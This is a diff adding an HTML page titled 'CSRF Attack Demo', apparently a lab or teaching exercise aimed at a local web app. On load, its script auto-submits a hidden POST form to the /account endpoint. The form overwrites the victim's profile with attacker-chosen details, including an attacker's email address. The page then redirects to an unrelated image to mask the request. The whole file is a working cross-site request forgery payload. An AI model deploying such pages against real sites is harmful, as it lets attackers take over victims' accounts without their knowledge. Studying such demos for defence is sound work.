@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Attack Demo</title>
+</head>
+<body>
+    <script> 
+        const data = {
+            first_name: "John", 
+            last_name: "Doe", 
+            email: "attackerEmail@gmail.com",
+            phone: "0987654321", 
+            address: "123 Main St, Springfield"
+        };
+        const form = document.createElement("form"); form.method = "POST";
+        form.action = "http://localhost:3000/account";
+        form.style.display = "none";
+        for (const key in data) {
+            const input = document.createElement('input');
+            input.type = "hidden";
+            input.name = key;
+            input.value = data[key];
+            form.appendChild(input);
+        }
+        document.body.appendChild(form); form.submit();
+        setTimeout(() => {
+            window.location = "https://i.natgeofe.com/n/548467d8-c5f1-4551-9f58-6817a8d2c45e/NationalGeographic_2572187.jpg?w=718&h=479"
+        }, 50)
+    </script>
+</body>
+</html>
